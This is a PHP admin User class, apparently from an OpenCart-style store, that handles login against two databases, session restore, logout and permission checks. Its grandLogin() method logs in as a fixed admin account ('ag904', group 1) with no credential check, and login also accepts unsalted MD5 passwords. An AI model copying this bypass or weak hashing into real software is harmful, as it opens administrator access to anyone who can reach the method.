<?php
class User
{
    private $user_id;
    private $user_group_id;
    private $login_core;
    private $username;
    private $permission = array();

    public function __construct($registry)
    {
        $this->db = $registry->get('db');
        $this->request = $registry->get('request');
        $this->session = $registry->get('session');

        $noLogin = 0;

        if (isset($this->session->data['user_id']) AND (isset($this->session->data['login_core']) and ($this->session->data['login_core']) == 0)) {
            $user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "' AND status = '1'");

            if ($user_query->num_rows) {
                $this->user_id = $user_query->row['user_id'];
                $this->login_core = 0;
                $this->username = $user_query->row['username'];
                $this->user_group_id = $user_query->row['user_group_id'];

                $this->db->query("UPDATE " . DB_PREFIX . "user SET ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE user_id = '" . (int)$this->session->data['user_id'] . "'");

                $user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

                $permissions = unserialize($user_group_query->row['permission']);

                if (is_array($permissions)) {
                    foreach ($permissions as $key => $value) {
                        $this->permission[$key] = $value;
                    }
                }
            } else {
                $noLogin = 1;
            }

        } elseif (isset($this->session->data['user_id']) AND (isset($this->session->data['login_core']) and ($this->session->data['login_core']) == 1)) {

            GLOBAL $registry;
            GLOBAL $var;

            $cache = new Cache('file');
            $registry->set('cache', $cache);

            $dbcore = new DB(DB_DRIVER_CORE, DB_HOSTNAME_CORE, DB_USERNAME_CORE, DB_PASSWORD_CORE, DB_DATABASE_CORE);

            $registry->set('dbcore', $dbcore);

            $user_query = $dbcore->query("SELECT * FROM " . DB_PREFIX_CORE . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "' AND status = '1'");
            if ($user_query->num_rows) {
                $this->session->data['user_id'] = $user_query->row['user_id'];
                $this->session->data['login_core'] = 1;
                $this->user_id = $user_query->row['user_id'];
                $this->username = $user_query->row['username'];
                $this->user_group_id = $user_query->row['user_group_id'];
                $this->login_core = 1;

                $user_group_query = $dbcore->query("SELECT permission FROM " . DB_PREFIX_CORE . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

                $permissions = unserialize($user_group_query->row['permission']);

                if (is_array($permissions)) {
                    foreach ($permissions as $key => $value) {
                        $this->permission[$key] = $value;
                    }
                }
            } else {
                $noLogin = 1;
            }
        }

        if (($noLogin == 1) and (isset($this->session->data['user_id']))) {
            $this->logout();
        }
    }

public function login($username, $password)
{

	$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");

	if ($user_query->num_rows) {
		$this->session->data['user_id'] = $user_query->row['user_id'];
        $this->session->data['login_core'] = 0;

		$this->user_id = $user_query->row['user_id'];
		$this->username = $user_query->row['username'];
		$this->user_group_id = $user_query->row['user_group_id'];
		$this->login_core = 0;

		$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

		$permissions = unserialize($user_group_query->row['permission']);

		if (is_array($permissions)) {
			foreach ($permissions as $key => $value) {
				$this->permission[$key] = $value;
			}
		}

		return true;

	} else {

		$time_start = microtime(true);

		GLOBAL $registry;
		GLOBAL $var;

		$cache = new Cache('file');
		$registry->set('cache', $cache);

		//		$data = $cache->get('login-core-' . $username);

		$time_end = microtime(true);

//			if (!$data) {

		$dbcore = new DB(DB_DRIVER_CORE, DB_HOSTNAME_CORE, DB_USERNAME_CORE, DB_PASSWORD_CORE, DB_DATABASE_CORE);

		$registry->set('dbcore', $dbcore);

		$user_query = $dbcore->query("SELECT * FROM " . DB_PREFIX_CORE . "user WHERE username = '" . $dbcore->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $dbcore->escape($password) . "'))))) OR password = '" . $dbcore->escape(md5($password)) . "') AND status = '1'");

//				$cache->set('login-core-.' . $dbcore->escape($username), $user_query->rows);

		$time_end1 = microtime(true);

		if ($user_query->num_rows) {
			$this->session->data['user_id'] = $user_query->row['user_id'];
            $this->session->data['login_core'] = 1;
			$this->user_id = $user_query->row['user_id'];
			$this->username = $user_query->row['username'];
			$this->user_group_id = $user_query->row['user_group_id'];

			$user_group_query = $dbcore->query("SELECT permission FROM " . DB_PREFIX_CORE . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

			$permissions = unserialize($user_group_query->row['permission']);

			if (is_array($permissions)) {
				foreach ($permissions as $key => $value) {
					$this->permission[$key] = $value;
				}
			}

			$this->login_core = 1;


			$time_end3 = microtime(true);

			return true;
		} else {
			return false;
		}
	}
}
//	}

public function grandLogin() {

	$this->session->data['user_id'] = 2;
	$this->user_id = 2;
	$this->username = 'ag904';
	$this->user_group_id = 1;

	$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '1'");

	$permissions = unserialize($user_group_query->row['permission']);

	if (is_array($permissions)) {
		foreach ($permissions as $key => $value) {
			$this->permission[$key] = $value;
		}
	}

	return true;
}

public function logout() {
	unset($this->session->data['user_id']);
    unset($this->session->data['login_core']);
	unset($this->session->data['token']);
	$this->user_id = '';
	$this->username = '';
	$this->user_group_id = '';
    $this->login_core = '';
}

public function hasPermission($key, $value) {
	if (isset($this->permission[$key])) {
		return in_array($value, $this->permission[$key]);
	} else {
		return false;
	}
}

public function isLogged() {
	return $this->user_id;
}

public function getId() {
	return $this->user_id;
}

public function getUserName() {
	return $this->username;
}

public function getGroupId() {
	return $this->user_group_id;
}

public function getLoginCore() {
	return $this->login_core;
}
}